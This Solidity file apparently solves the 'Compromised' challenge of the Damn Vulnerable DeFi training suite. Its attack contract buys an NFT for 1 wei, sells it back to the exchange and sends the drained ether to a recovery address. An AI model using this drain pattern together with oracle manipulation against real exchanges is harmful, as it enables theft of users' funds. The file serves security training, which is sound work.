// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;


import {TrustfulOracle} from "../../src/compromised/TrustfulOracle.sol";
import {TrustfulOracleInitializer} from "../../src/compromised/TrustfulOracleInitializer.sol";
import {Exchange} from "../../src/compromised/Exchange.sol";
import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";


contract CompromisedAttack is IERC721Receiver{

    TrustfulOracle oracle;
    Exchange exchange;
    DamnValuableNFT nft;
    uint nftId;
    address recovery;

    constructor(    
        TrustfulOracle _oracle,
        Exchange _exchange,
        DamnValuableNFT _nft,
        address _recovery
    ) payable {
        oracle = _oracle;
        exchange = _exchange;
        nft = _nft;
        recovery = _recovery;
    }

    function buy() external payable{
        uint _nftId = exchange.buyOne{value:1}();
        nftId = _nftId;
    }
    
    function sell() external payable{
        nft.approve(address(exchange), nftId);
        exchange.sellOne(nftId);
    }

    function recover(uint amount) external {
        payable(recovery).transfer(amount);
    }

    function onERC721Received(
        address /* operator */,
        address /* from */,
        uint256 /* tokenId */,
        bytes calldata /* data */
    ) external pure returns (bytes4) {
        return this.onERC721Received.selector;
    }

    receive() external payable{
    }
}